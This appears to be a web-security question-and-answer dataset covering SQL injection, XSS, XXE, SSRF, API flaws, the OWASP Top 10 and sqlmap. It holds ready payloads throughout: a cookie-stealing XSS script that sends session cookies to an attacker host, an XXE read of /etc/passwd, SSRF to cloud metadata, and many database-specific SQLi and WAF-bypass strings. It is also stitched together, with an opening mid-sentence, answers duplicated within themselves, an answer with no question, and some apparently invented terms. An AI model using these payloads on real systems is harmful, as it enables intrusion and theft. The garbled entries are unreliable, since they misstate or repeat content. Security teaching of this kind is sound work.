By observing the time delay, the attacker can extract data one character at a time.

---

Question: What is a simple but effective payload to test for reflected Cross-Site Scripting (XSS)?
Answer: The most common and effective initial test payload for reflected XSS is: `<script>alert('XSS1')</script>`.
How to use it:
1. Identify an input field, like a search bar or a URL parameter (e.g., `?q=test`).
2. Enter the payload into the field.
3. If the application is vulnerable, the server will "reflect" this script back into the HTML of the results page without properly encoding it.
4. The user's browser will execute the script, and an alert box with the message 'XSS1' will pop up. This confirms the vulnerability.

---

Question: Provide an advanced XSS payload that can steal a user's session cookie.
Answer: A payload to steal cookies must send the cookie data to a server controlled by the attacker.
Example Payload: `<script>document.location='http://attacker-server.com/cookie_stealer.php?c=' + document.cookie;</script>`
How it works:
1. The `<script>` tag is injected into the vulnerable page.
2. When a victim loads the page, their browser executes the script.
3. `document.cookie` accesses the user's session cookie for the current site.
4. The script then redirects the browser to the attacker's server, appending the stolen cookie data as a URL parameter.
5. The attacker's server logs the request, capturing the cookie and allowing them to hijack the victim's session.

---

Question: What is an XML External Entity (XXE) payload used to read local files?
Answer: An XXE payload abuses the XML parser's ability to define and use external entities. To read the `/etc/passwd` file on a Linux server, a common payload would be:
`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>`
How it works:
1. `<!DOCTYPE foo [...]>` defines a new document type.
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declares an entity named `xxe` and tells the parser its content is the contents of the `/etc/passwd` file.
3. `&xxe;` in the body of the XML then references this entity.
4. If the application is vulnerable, the parser will replace `&xxe;` with the content of the file, which may then be displayed to the attacker in the application's response.

---

Question: Give a payload for a basic Server-Side Request Forgery (SSRF) attack.
Answer: SSRF payloads trick the server into making a request to a resource it shouldn't. They are highly dependent on the application's functionality.
Example Scenario: An application that fetches a user's profile picture from a URL. The parameter might be `?imageUrl=http://example.com/pic.jpg`.
SSRF Payload: An attacker would change the URL to an internal service.
- To scan a port on the server itself (localhost): `?imageUrl=http://127.0.0.1:22` (to check for SSH)
- To access a cloud metadata service: `?imageUrl=http://169.254.169.254/latest/meta-data/`
If the server's response changes (e.g., shows an error message from the SSH port or returns cloud credentials), the application is vulnerable to SSRF.

---

Question: How can you bypass a Web Application Firewall (WAF) for SQL injection?
Answer: WAF bypass involves obfuscating a payload to avoid detection by security filters. Common techniques include:
1. Case Variation: Changing the case of SQL keywords (e.g., `SeLeCt` instead of `SELECT`).
2. Comments: Using inline comments to break up keywords (e.g., `UNI/**/ON SE/**/LECT`).
3. Encoding: Using URL encoding (`%20` for a space) or Hex encoding for characters.
4. Whitespace Characters: Replacing spaces with other valid whitespace characters like tabs, newlines, or special unicode spaces.
5. Obscure Functions: Using less common but valid database functions to achieve the same result as a blocked function.

---

Question: Provide an example of a database-specific SQLi payload that would not work on other databases.
Answer: Database engines have unique functions and syntax.
For Oracle: A payload to extract the database version might be `' UNION SELECT banner, NULL FROM v$version--`. The `v$version` view is specific to Oracle.
For Microsoft SQL Server: A payload to list tables might use `sysobjects`: `' UNION SELECT name, NULL FROM sysobjects WHERE xtype='U'--`.
For MySQL: A payload might use the version-specific comment syntax: `' AND 1=1/*!50000UNION SELECT 1,2,3*/--`. This code only runs on MySQL version 5.0 or higher.

---

Question: What is Broken Function Level Authorization (BFLA) in an API, and how is it different from IDOR?
Answer: Broken Function Level Authorization (BFLA) occurs when an API fails to check if a user has the permission to perform a specific *action* or function, especially administrative ones.
Difference from IDOR:
- IDOR (Broken Object Level Authorization) is about a user accessing *data* they shouldn't be able to (e.g., User A accessing User B's invoice).
- BFLA is about a regular user successfully calling an *endpoint* reserved for admins (e.g., a regular user making a successful call to `POST /api/admin/createNewUser`).
The attacker isn't accessing someone else's object; they are illegitimately using a privileged function.

---

Question: Explain a Mass Assignment vulnerability in an API with an example.
Answer: Mass Assignment occurs when an API endpoint automatically binds incoming JSON data to an internal object without filtering what fields are allowed. An attacker can abuse this by "assigning" values to fields they should not be able to control.
Example: A user updates their profile with `PUT /api/users/me` and sends this JSON: `{"username": "new_name", "email": "new@email.com"}`.
The attacker modifies the request to include a hidden property: `{"username": "hacker", "email": "hacker@email.com", "isAdmin": true}`.
If the API is vulnerable, the backend might automatically update the user object, making the attacker an administrator.

---

Question: How can a CORS misconfiguration be a security risk for an API?
Answer: CORS (Cross-Origin Resource Sharing) is a browser security feature that controls which websites can make requests to your API. A misconfiguration occurs when the API is too permissive.
The biggest risk is a misconfigured `Access-Control-Allow-Origin` header that dynamically reflects the `Origin` header from the request.
An attacker can host a malicious script on `http://evil-site.com`. A victim who is logged into your application visits `evil-site.com`. The script on the evil site then makes a request to your vulnerable API. Your API sees the `Origin: http://evil-site.com` header and reflects it back, allowing the evil site to read the sensitive data returned by the API, effectively bypassing browser security.

---

Question: What is the single most effective way to prevent SQL injection?
Answer:  The single most effective way to prevent SQL injection is to use parameterized queries, also known as prepared statements. With parameterized queries, the database engine is told to treat user-supplied input strictly as data, not as executable code. This makes it impossible for an attacker to change the logic of the query. The single most effective way to prevent SQL injection is to use parameterized queries, also known as prepared statements. With parameterized queries, the database engine is told to treat user-supplied input strictly as data, not as executable code. This makes it impossible for an attacker to change the logic of the query.

Question: What is the most effective way to prevent Cross-Site Scripting (XSS)?
Answer: The most effective way to prevent XSS is through context-aware output encoding. This means that before any user-supplied data is rendered on a page, it should be encoded for the specific context it's being placed in. Implementing a strong Content Security Policy (CSP) is another critical defense layer.  The most effective way to prevent XSS is through context-aware output encoding. This means that before any user-supplied data is rendered on a page, it should be encoded for the specific context it's being placed in (e.g., HTML body, HTML attribute, JavaScript block). Implementing a strong Content Security Policy (CSP) is another critical defense layer.

Question: Explain a Mass Assignment vulnerability in an API with an example.
Answer: Mass Assignment occurs when an API endpoint automatically binds incoming JSON data to an internal object without filtering what fields are allowed. An attacker can abuse this by "assigning" values to fields they should not be able to control. For example, an attacker could submit `{"isAdmin": true}` in a profile update request and illegitimately gain admin privileges.

Question: How can a CORS misconfiguration be a security risk for an API?
Answer: CORS (Cross-Origin Resource Sharing) is a browser security feature that controls which websites can make requests to your API. A misconfiguration occurs when the API is too permissive, such as dynamically reflecting the `Origin` header from the request. This allows a malicious website to make requests to your API on behalf of a logged-in user and steal their data.

Question: What is a Server-Side Request Forgery (SSRF) vulnerability in the context of an API?
Answer: An SSRF vulnerability in an API occurs when an attacker can trick the server-side application into making an HTTP request to an arbitrary domain of their choosing. This can be used to pivot and attack internal network services that are normally protected by a firewall, scan internal ports, or query cloud provider metadata endpoints to steal credentials.

Question: What is the OWASP Top 10?
Answer: The OWASP Top 10 is a standard awareness document for developers and web application security professionals. It represents a broad consensus about the most critical security risks to web applications. OWASP (Open Web Application Security Project) typically updates the list every three to four years based on comprehensive data from security firms and the corporate world. It is not a complete standard, but rather a starting point for improving application security.
SOURCES:
https://owasp.org/www-project-top-ten/

---

Question: Can you list and explain the OWASP Top 10 for 2021?
Answer: Yes. The OWASP Top 10 for 2021 was a major update that introduced new categories and re-categorized others based on modern data. Here is the complete list:
A01:2021 - Broken Access Control: This moves up to the #1 spot. It occurs when restrictions on what authenticated users are allowed to do are not properly enforced. This allows attackers to access other users' accounts, view sensitive files, or modify other users' data.
A02:2021 - Cryptographic Failures: This category focuses on failures related to cryptography, which often leads to the exposure of sensitive data. Examples include transmitting data in cleartext, using old or weak cryptographic algorithms, or poor key management.
A03:2021 - Injection: This category is broadened to include Cross-Site Scripting (XSS) in addition to SQL, NoSQL, OS, and LDAP injection. It happens when an attacker can send untrusted data to an interpreter as part of a command or query.
A04:2021 - Insecure Design: This is a new category focusing on risks related to design and architectural flaws. It emphasizes the need for threat modeling and secure design patterns from the beginning of a project's lifecycle, not just fixing implementation bugs later.
A05:2021 - Security Misconfiguration: This includes missing appropriate security hardening across any part of the application stack. Examples are default credentials, verbose error messages showing sensitive information, and enabling unnecessary features.
A06:2021 - Vulnerable and Outdated Components: This risk category is about using components, such as libraries, frameworks, and other software modules, with known security vulnerabilities (CVEs). This was the root cause of massive breaches like the Equifax breach (Apache Struts) and the Log4j crisis.
A07:2021 - Identification and Authentication Failures: This category covers user identity and session management. It includes vulnerabilities like allowing brute-force attacks, weak password policies, and improper session invalidation after logout.
A08:2021 - Software and Data Integrity Failures: A new category that focuses on making assumptions about the integrity of software updates, critical data, and CI/CD pipelines without verification. It includes insecure deserialization and supply chain attacks.
A09:2021 - Security Logging and Monitoring Failures: This category deals with the inability to detect and respond to attacks. It includes insufficient logging, lack of monitoring, and ineffective alerting.
A10:2021 - Server-Side Request Forgery (SSRF): This vulnerability was added to the Top 10 in 2021. It occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to coerce the application to send a crafted request to an unexpected destination.
SOURCES:
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/

---

Question: For comparison, what were the OWASP Top 10 for 2017?
Answer: The 2017 list provides important context to see how the threat landscape has evolved. The categories were:
A1:2017 - Injection
A2:2017 - Broken Authentication
A3:2017 - Sensitive Data Exposure
A4:2017 - XML External Entities (XXE)
A5:2017 - Broken Access Control
A6:2017 - Security Misconfiguration
A7:2017 - Cross-Site Scripting (XSS)
A8:2017 - Insecure Deserialization
A9:2017 - Using Components with Known Vulnerabilities
A10:2017 - Insufficient Logging & Monitoring

---

Question: What were the biggest changes between the 2017 and 2021 OWASP Top 10 lists?
Answer: There were several major changes reflecting the evolution of web application threats:
1. New Categories: Three new categories were introduced in 2021: Insecure Design, Software and Data Integrity Failures, and Server-Side Request Forgery (SSRF) was added as its own category.
2. Merged Categories: To consolidate similar risks, Cross-Site Scripting (XSS) was merged into the broader 'Injection' category in 2021. XML External Entities (XXE) was merged into the 'Security Misconfiguration' category.
3. Upward Movement: Broken Access Control moved from #5 in 2017 to the #1 spot in 2021, showing how prevalent this issue has become.
4. Data-Driven Focus: The 2021 list was created with a much stronger emphasis on collected data, which led to the re-prioritization and creation of these new categories.

Question: What is SQL?
Answer: SQL stands for Structured Query Language. It is a standardized programming language used to manage and manipulate relational databases. It is used to perform tasks such as retrieving data, updating data, inserting new data, and deleting data from a database.

---

Question: What is an API?
Answer: API stands for Application Programming Interface. It is a set of rules, protocols, and tools that allows different software applications to communicate with each other. In web development, APIs are commonly used to allow a client (like a web browser or mobile app) to request data from and send data to a server.

---

Question: What is the difference between a database, a DBMS, and SQL?
Answer: A database is an organized collection of data, like a filing cabinet. A DBMS (Database Management System) is the software that manages the database, like the clerk who organizes the cabinet (e.g., MySQL, PostgreSQL). SQL is the language you use to communicate with the DBMS to ask for or change files.

---

Question: What are the main sub-languages of SQL?
Answer: SQL is primarily composed of four sub-languages:
1. DQL (Data Query Language): Used for retrieving data, primarily with the SELECT statement.
2. DDL (Data Definition Language): Used for defining the database structure with commands like CREATE TABLE, ALTER, and DROP.
3. DML (Data Manipulation Language): Used for adding, deleting, and modifying data with commands like INSERT, UPDATE, and DELETE.
4. DCL (Data Control Language): Used for managing user permissions with commands like GRANT and REVOKE.

---

Question: What is a SQL query?
Answer: A SQL query is a specific command, written in the SQL language, that is sent to a database to perform a task. This can range from retrieving a specific set of data to creating a new table or updating existing records.

---

Question: What is a 'schema' in a database?
Answer: A schema is a logical container or blueprint that holds a collection of related database objects, such as tables, views, and stored procedures. It helps in organizing and managing the database structure, especially in large, complex databases.

---

Question: What is a primary key?
Answer: A primary key is a special column (or set of columns) in a table that uniquely identifies each record. It must contain unique values and cannot have NULL values, ensuring data integrity.

---

Question: What is a foreign key?
Answer: A foreign key is a key that creates a relationship between two tables. It is a field in one table that refers to the primary key in another table, enforcing referential integrity between them.

---

Question: What is the difference between WHERE and HAVING clauses?
Answer: The WHERE clause is used to filter individual rows *before* they are grouped together by the GROUP BY clause. The HAVING clause is used to filter entire groups of rows *after* the GROUP BY clause has been applied.

---

Question: What is normalization in a database?
Answer: Normalization is the process of structuring a relational database to minimize data redundancy and improve data integrity. It involves dividing large tables into smaller, more manageable tables and defining relationships between them.

---

Question: What is the difference between DROP, TRUNCATE, and DELETE?
Answer: DELETE is a DML command that removes rows one by one based on a condition and can be rolled back. TRUNCATE is a DDL command that removes all rows from a table quickly and cannot be rolled back. DROP is a DDL command that completely removes the table's structure, data, and indexes.

---

Question: What is a stored procedure?
Answer: A stored procedure is a pre-compiled set of one or more SQL statements that are stored on the database server. It can be executed by name, accept parameters, and improve performance by reducing network traffic.

---

### Category: SQL Injection Fundamentals

Question: What is In-Band SQL Injection?
Answer: In-Band SQLi is the most common form of attack where the attacker uses the same communication channel to launch the attack and receive the results. The main types are Error-based (relying on error messages) and Union-based (using the UNION operator to combine results).

---

Question: What is Out-of-Band SQL Injection (OOB-SQLi)?
Answer: OOB-SQLi is an advanced technique used when the application's response is not useful. The payload forces the database to make an external network connection (like a DNS or HTTP request) to an attacker-controlled server to exfiltrate data.

---

Question: What is a first-order SQL injection?
Answer: A first-order SQLi is the standard, immediate type of attack. The attacker injects a malicious payload, the server executes it instantly, and the result is seen in the direct response from the application.

---

Question: What is a second-order or stored SQL injection?
Answer: In a second-order injection, the malicious input is first stored by the application (e.g., in a username or comment). The attack is triggered at a later time when that stored data is retrieved and included in a different, vulnerable SQL query.

---

Question: Why is 'information gathering' important before performing SQLi?
Answer: Information gathering is crucial for a successful attack. An attacker needs to know the database type (MySQL, Oracle, etc.), version, and schema (table and column names) to craft effective payloads that can successfully exfiltrate data.

---

Question: What are information_schema tables in MySQL?
Answer: `information_schema` is a built-in database in MySQL that acts as a data dictionary, containing metadata about all other databases, tables, columns, and user privileges. It is a primary target for attackers to map out the database.

---

Question: What is the purpose of the `ORDER BY` clause in a UNION-based SQLi attack?
Answer: In a UNION-based attack, the attacker must know the number of columns in the original query. They inject `ORDER BY 1`, `ORDER BY 2`, etc., incrementing the number. The last number that doesn't produce an error reveals the correct column count.

---

Question: What is a stacked query SQL injection?
Answer: A stacked query injection is possible if the database technology supports executing multiple SQL statements in a single request, separated by a semicolon (;). This allows an attacker to append entirely new, malicious commands after the original query.

---

Question: What is content-based blind SQL injection?
Answer: A blind SQLi technique where the attacker asks the database a series of True/False questions. They then observe subtle differences in the application's response content (e.g., one message for true, another for false) to infer the answer.

---

Question: What is the role of character encoding in SQLi attacks?
Answer: Character encoding can be used to bypass security filters like a WAF. An attacker might use a non-standard or multi-byte encoding that the WAF doesn't recognize, but that the backend database decodes into a malicious character.

---

### Category: Advanced SQL Injection Techniques & Payloads

Answer: A payload could be: `' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--`

---

Question: How do you perform a SQL injection in a `LIMIT` clause?
Answer: This is a rare vulnerability, but in older MySQL versions, you could inject into the `LIMIT` clause with `PROCEDURE ANALYSE()` to leak schema information from the query results.

---

Question: What is a "dangling link" SQL injection?
Answer: A form of second-order injection where a user's malicious input creates a seemingly harmless link. When another user or system process interacts with this link, it triggers a malicious query containing their session details.

---

Question: What is a SQL injection payload using the `GROUP_CONCAT` function in MySQL?
Answer: A payload could be: `' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--`. This is used to retrieve all table names from the current database in a single row.

---

Question: How to perform SQLi in an `INSERT` statement?
Answer: A payload like `value'); --` can terminate the statement. A more advanced payload like `value'), ('another_value` can be used to insert an entirely new row of data.

---

Question: What is a payload for error-based injection in Oracle?
Answer: A payload could be: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--`. This forces a specific kind of error that reveals the current database user in the error message.

---

Question: How can the `LIKE` clause be vulnerable to SQL injection?
Answer: If user input is placed directly inside a `LIKE` clause (e.g., `LIKE '%$input%'`), an attacker can use a payload like `%' AND 1=1 --` to terminate the string and alter the query logic.

---

Question: What is a boolean-based payload to check if a user 'admin' exists?
Answer: A payload could be: `' AND (SELECT 'a' FROM users WHERE username='admin')='a'--`. This will be true if the subquery finds the user and returns 'a'.

---

Question: What is a payload to get the current database user in PostgreSQL?
Answer: A payload could be: `' UNION SELECT 1, current_user, 3--`

---

Question: How do you bypass a filter that blocks the word 'UNION'?
Answer: Common bypass techniques include case variation (`UnIoN`), inline comments (`UNI/**/ON`), URL encoding (`%55NION`), or using other whitespace characters instead of spaces.

---

Question: What is a payload to find the database version in SQL Server without using `@@version`?
Answer: An alternative function for this is `(SELECT SERVERPROPERTY('productversion'))`, which provides detailed version information.

---

Question: How can you use hexadecimal encoding in a SQLi payload?
Answer: String literals can be replaced with their hex equivalent to bypass filters that look for quote characters. For example, `'admin'` can be written as `0x61646d696e` in MySQL.

---

Question: What is a payload for a time-based blind injection in a `WHERE` clause?
Answer: A payload could be: `id=1' AND IF(1=1,SLEEP(5),0) AND '1'='1`. This injects a conditional sleep command within the existing logic.

---

Question: What is a "cookie-based" SQL injection?
Answer: This is when the injection vulnerability exists in a parameter that is passed within a user's cookie value. An attacker would need to modify their browser cookies in-transit to exploit it.

---

### Category: SQL Injection Prevention & Mitigation

Question: What is input validation?
Answer: Input validation is the critical security control of testing any user-supplied data to ensure it meets a strict set of rules for length, type, and content before it is processed by the application.

---

Question: What is the difference between allow-listing and deny-listing?
Answer: Allow-listing (or whitelisting) only permits input that is known to be good (e.g., only allowing letters and numbers). Deny-listing (or blacklisting) tries to block known bad input (e.g., blocking `<script>`). Allow-listing is far more secure.

---

Question: What is output encoding?
Answer: Output encoding is the process of converting untrusted data into a safe format for the context in which it will be displayed, such as converting `<` to `&lt;` in HTML to prevent XSS.

---

Question: Why is using stored procedures not a complete defense against SQLi?
Answer: Stored procedures are only safe if they use parameters correctly. If they build dynamic SQL queries inside them by concatenating unvalidated input, they are just as vulnerable as regular queries.

---

Question: What is the principle of least privilege?
Answer: This security principle states that a user account or process should only have the absolute minimum permissions necessary to perform its intended function, thus limiting the damage an attacker can do if compromised.

---

Question: How does ORM help prevent SQL injection?
Answer: ORM (Object-Relational Mapping) libraries (e.g., SQLAlchemy, Hibernate) are designed to use parameterized queries by default, which is the recommended way to prevent SQL injection. They abstract away raw SQL.

---

Question: Why is escaping user input less effective than parameterized queries?
Answer: Escaping characters (e.g., `\'`) is prone to error, can be bypassed with clever encoding, and developers may forget to apply it everywhere. Parameterized queries are safer because they separate the query logic from the data at a fundamental level.

---

Question: Can a database firewall help prevent SQLi?
Answer: Yes, a Web Application Firewall (WAF) or a dedicated database firewall can block known malicious query patterns as a valuable defense-in-depth measure, but it should not be the primary defense.

---

Question: How can type casting prevent SQL injection?
Answer: If an input is expected to be a number (like a user ID), explicitly casting it to an integer type in the code will cause any non-numeric payload to be discarded or raise an error, neutralizing the attack.

---

Question: How do you securely handle dynamic table or column names?
Answer: Parameterized queries cannot be used for table or column names. The only safe method is to validate the user-provided name against a hardcoded allow-list of known, safe names before using it in a query.

---

### Category: SQL Injection in Different Contexts

Question: What is NoSQL injection?
Answer: NoSQL injection is an attack targeting NoSQL databases like MongoDB. The payloads use NoSQL syntax, often involving injecting JSON or JavaScript operators (like `$gt`, `$ne`) to manipulate query logic.

---

Question: What is an example of a MongoDB injection payload?
Answer: An attacker might bypass authentication by providing a password of `{"$ne": null}`. The query becomes `db.users.find({username: "admin", password: {"$ne": null}})` which finds a user where the password is "not equal to null".

---

Question: What is LDAP injection?
Answer: LDAP injection is an attack that exploits applications that build LDAP queries from user input. The payloads use LDAP filter syntax (e.g., `*)(uid=*))(|(uid=*`) to bypass authentication or access unauthorized directory data.

---

Question: What is XPath injection?
Answer: XPath injection targets applications that use user input to construct XPath queries for XML data. An attacker can inject XPath syntax to navigate the XML tree and access unauthorized information.

---

Question: How can a search function be vulnerable to SQLi?
Answer: Search functions often use the `LIKE` clause in SQL. If user input is concatenated directly into the query, a payload like `test%' OR 1=1 --` can be used to alter the query and dump all data from the table.

---

Question: Can an ORDER BY clause be exploited for data exfiltration?
Answer: Yes, in some databases, `ORDER BY` can be used with conditional statements (like `CASE WHEN...`). This can be abused in a blind SQLi attack to infer data by observing how the sort order of results changes.

---

Question: What is a "deep blind" SQL injection?
Answer: This is a very difficult blind SQLi scenario where there is no observable difference in the application's response content or time. It may require very advanced, side-channel techniques to exfiltrate data.

---

Question: How can an API endpoint be vulnerable to SQL injection?
Answer: An API endpoint is vulnerable just like a traditional web page. If it accepts a parameter (from the URL, a JSON body, etc.) and uses that parameter in an unsafe database query, it can be exploited.

---

Question: What is header-based SQL injection?
Answer: This occurs when the injection vulnerability is in an HTTP header, such as `User-Agent` or `Referer`. This can happen if the application logs these headers to a database without proper sanitization.

---

Question: Can database link injection occur?
Answer: Yes, in environments like Oracle that use database links to connect to other databases, an attacker who can control part of a query using a link might be able to inject commands to run on the linked remote database.

---

### Category: Tooling & Automation

Question: What is the primary function of the tool sqlmap?
Answer: sqlmap is a powerful, open-source penetration testing tool that automates the entire process of detecting, exploiting, and exfiltrating data from SQL injection vulnerabilities.

---

Question: What does the `--dbs` flag do in sqlmap?
Answer: The `--dbs` flag instructs sqlmap to enumerate the names of all available databases on the server once a vulnerability has been confirmed.

---

Question: How do you tell sqlmap to test a specific parameter?
Answer: The `-p` flag is used to specify the parameter to test. For example, `sqlmap -u "url" -p "vulnerable_param"` focuses the attack on that single parameter.

---

Question: What is the `--risk` level in sqlmap?
Answer: The `--risk` level (from 1 to 3) controls how intrusive the tests are. Higher risk levels use more dangerous payloads that could potentially modify data or perform more aggressive tests.

---

Question: How can you use sqlmap to test a POST request?
Answer: You save the raw POST request from a tool like Burp Suite into a text file (e.g., `request.txt`) and then run sqlmap with the `-r request.txt` flag to have it replay and test that request.

---

Question: What is the `--os-shell` flag in sqlmap?
Answer: The `--os-shell` flag attempts to upload a web shell to the server to provide an interactive operating system command shell. This requires high database user privileges and a writable directory on the server.

---

Question: Besides sqlmap, what are other tools used to find SQLi?
Answer: Burp Suite Scanner, Acunetix, Netsparker, and other Dynamic Application Security Testing (DAST) tools are commonly used to automatically scan web applications for SQL injection vulnerabilities.

---

Question: What is a "tamper script" in sqlmap?
Answer: A tamper script is a Python script that sqlmap can use to obfuscate its payloads in various ways, such as adding comments, changing character case, or encoding characters, in order to bypass a WAF.

---

Question: How can you handle a login form with sqlmap?
Answer: You can use the `--forms` flag to automatically find and test forms on a page, or you can provide the POST request data directly with the `--data` flag.

---

Question: What does the `--technique` flag do in sqlmap?
Answer: It forces sqlmap to test for only a specific type of SQL injection. For example, `B` for boolean-blind, `T` for time-blind, or `U` for UNION query. This can speed up scans significantly.

---

### Category: Real-World & Business Impact

Question: What is the business impact of a successful SQL injection attack?
Answer: The business impact of a major SQLi can be catastrophic. It includes massive data theft (customer PII, credit cards, intellectual property), complete system compromise, severe reputational damage, huge financial loss, and major legal penalties.

---

Question: What was the famous Equifax breach caused by?
Answer: The 2017 Equifax breach, which compromised the data of over 147 million people, was caused by a known vulnerability in the Apache Struts web framework. The specific flaw was a Remote Code Execution vulnerability (CVE-2017-5638). This is a classic example of "A06:2021 - Vulnerable and Outdated Components" from the OWASP Top 10.
---

Question: Can SQL injection lead to a full server takeover?
Answer: Yes, absolutely. With high database privileges, an attacker can use SQLi to read or write files. This can allow them to upload a web shell, which provides the ability to execute operating system commands and achieve a full server compromise.

---

Question: How does SQL injection relate to compliance standards like PCI DSS?
Answer: Protecting against common vulnerabilities like SQL injection is a strict requirement for the PCI DSS standard. A successful SQLi that exposes cardholder data constitutes a major compliance failure with severe financial penalties.

---

Question: What is the difference between SQLi and Cross-Site Scripting (XSS)?
Answer: SQLi is a server-side attack targeting the database, where the goal is to manipulate the application's database queries. XSS is a client-side attack targeting other users by injecting malicious scripts into their browsers.

---

Question: Why are error messages a security risk?
Answer: Verbose, detailed error messages can leak sensitive information about the database, such as the version, table names, or query snippets. An attacker uses this information to refine and perfect their SQL injection attack.

---

Question: Is it possible to perform SQLi if the application is not using a SQL database?
Answer: No, SQL injection specifically targets SQL-based databases. However, conceptually similar injection attacks exist for other types of data stores, such as NoSQL injection for MongoDB or LDAP injection for LDAP directories. No, true SQL injection (SQLi) specifically targets SQL-based databases. However, other types of databases are vulnerable to similar attacks called NoSQL injection. These attacks exploit the syntax of non-relational databases like MongoDB or CouchDB, using malicious input to alter query logic and steal data.

---

Question: What is a "zero-day" SQL injection?
Answer: A "zero-day" would typically refer to a previously unknown vulnerability in a popular application, plugin, or database system that can be exploited via SQL injection. It means the vulnerability is being exploited before a patch is available.

---

Question: Why is it important to log SQL queries for security?
Answer: Logging executed queries, especially those that result in an error, is crucial for incident response. These logs can help investigators understand exactly what an attacker did, what data they accessed, and how to fix the vulnerability.

---

Question: How can a code review process help prevent SQLi?
Answer: A thorough, manual or automated code review process can identify areas in the code where developers are using unsafe practices, like string concatenation in queries. This allows vulnerabilities to be found and fixed before the code is deployed.

---

### Category: Esoteric & Advanced Concepts

Question: What is a differential injection?
Answer: This is another technical term for a content-based blind SQLi, where the attacker observes the "difference" in the page content to infer the boolean result of an injected query.

---

Question: Can SQLi occur through a DNS query?
Answer: This is a highly unusual but theoretically possible attack vector. It would require a misconfigured DNS server that logs queries to a vulnerable SQL database, allowing for injection through a crafted domain name lookup.

---

Question: What is a "SQL Truncation Attack"?
Answer: This is an attack where the database truncates (shortens) user-provided data that is too long for a column. This can be abused during registration to create an account with a name that collides with a privileged one, like 'admin'.

---

Question: How can SQL injection be used to create a Denial of Service (DoS)?
Answer: An attacker can inject resource-intensive queries, like the `BENCHMARK()` function in MySQL, that consume all the database's CPU or memory. This makes the database unavailable to legitimate users.

---

Question: What is a "data-only" attack in the context of SQLi?
Answer: A data-only attack is one where the goal is not to steal data but to subtly manipulate it for the attacker's benefit. For example, injecting a query that applies a 100% discount to an e-commerce order.

---

Question: What is the difference between `CHAR()` and `CONCAT()` in a WAF bypass?
Answer: `CONCAT()` is used to join strings together. `CHAR()` is used to generate a character from its ASCII value. An attacker might use `CHAR()` to construct a blocked keyword like `SELECT` from character codes to evade a WAF.

---

Question: How can SQL session variables be abused?
Answer: In MySQL, an attacker can set user-defined variables (e.g., `@a:=...`) to store data temporarily during a complex, multi-stage data exfiltration process, making the attack easier to manage.

---

Question: What is a "false positive" in an automated SQLi scan?
Answer: A false positive is when an automated scanner incorrectly reports a SQL injection vulnerability that does not actually exist, often by misinterpreting an application's unusual response.

---

Question: What is a "false negative" in an automated SQLi scan?
Answer: A false negative is when an automated scanner fails to detect a real SQL injection vulnerability. This often happens with complex, second-order, or heavily filtered vulnerabilities that require human logic to find.

---

Question: What is "SQL collation"?
Answer: Collation is a set of rules for how data is sorted and compared in a database. In some rare cases, a specific collation might treat certain characters as equivalent, which could potentially be abused to bypass a simple security filter.

---

Question: Can SQLi occur in an `UPDATE` statement's `SET` clause?
Answer: Yes. If user input controls the value being set, an attacker could inject a subquery. For example, they could set their own password to be equal to the admin's password: `SET password = (SELECT password FROM users WHERE username='admin')`.

---

Question: What is a "polyglot" injection payload?
Answer: A polyglot payload is a single string that is a valid attack for multiple different contexts at once. For example, a string that is both valid JavaScript for XSS and also contains valid SQL syntax for SQLi.

---

Question: Can you get SQLi through an integer-based parameter?
Answer: Yes. If the application code doesn't strictly enforce the integer type before using it in a query, it's vulnerable. Even if it does, it might return different errors for strings vs. integers, which can be used for blind injection.

---

Question: What is "SQL sharding"?
Answer: Sharding is a database architecture pattern for horizontally partitioning a large database into smaller, faster, more manageable parts called shards. It is a design principle and not directly related to injection vulnerabilities.

---

Question: How can the `PIVOT` operator in SQL Server be abused?
Answer: The `PIVOT` operator is a complex function for transforming data. If user input is allowed within its definition without strict sanitization, it could potentially lead to an injection vulnerability, though this is a very rare and specific scenario.

---

Question: What is the significance of the `mysql_real_escape_string` function?
Answer: This was a common PHP function for escaping SQL input. It is now deprecated and is often a sign of old, likely vulnerable legacy code, as it was frequently misused (e.g., with the wrong character set).

---

Question: Can you inject into a `TRUNCATE` statement?
Answer: No. The `TRUNCATE TABLE` command does not accept a `WHERE` clause or any parameters, so there is no place for user input to be injected. An attacker would need to use a stacked query to execute it.

---

Question: What is "taint analysis"?
Answer: Taint analysis is a form of static code analysis where a tool marks "tainted" data (all user input) and tracks it as it flows through the application. If this tainted data ever reaches a dangerous function (a "sink") like a database query without being sanitized, the tool flags a potential vulnerability.

---

Question: How does HTTP Parameter Pollution (HPP) relate to SQLi?
Answer: HPP is an attack where an attacker submits multiple HTTP parameters with the same name. This can be used to bypass a WAF by splitting a malicious SQL payload across two parameters, which are then concatenated by a vulnerable backend technology.

---

Question: What is the most important mindset for a security tester looking for SQLi?
Answer: The most important mindset is curiosity and persistence. A tester must treat every single piece of user-controllable input—including URLs, form fields, HTTP headers, and cookies—as a potential attack vector and methodically test how the application handles unexpected and malicious data.

---

Question: What is a REST API?
Answer: A REST (Representational State Transfer) API is an architectural style for designing networked applications. It uses a stateless, client-server model where resources are identified by URLs (endpoints). It relies on standard HTTP methods like GET, POST, PUT, DELETE, and PATCH to perform operations on these resources.

---

Question: What is a GraphQL API?
Answer: GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. Unlike REST, which has multiple endpoints, GraphQL typically exposes a single endpoint. It allows the client to request exactly the data it needs, which can prevent over-fetching and under-fetching of data.

---

Question: What is the difference between an API endpoint and a URL?
Answer: A URL (Uniform Resource Locator) is a full web address that specifies the location of a resource. An API endpoint is a specific URL within an API that a client can interact with to access a particular function or resource. For example, `https://api.example.com/users/123` is an endpoint within the `/users` resource.

---

Question: What are the most common HTTP methods used in REST APIs?
Answer: The most common HTTP methods are:
- GET: To retrieve data from a resource.
- POST: To create a new resource.
- PUT: To update an existing resource completely.
- DELETE: To remove a resource.
- PATCH: To partially update an existing resource.

---

Question: What is a JSON Web Token (JWT)?
Answer: A JWT is a compact, URL-safe standard for creating access tokens that assert some number of claims. A JWT is composed of three parts separated by dots: a header, a payload, and a signature. The signature is used to verify that the token has not been tampered with.

---

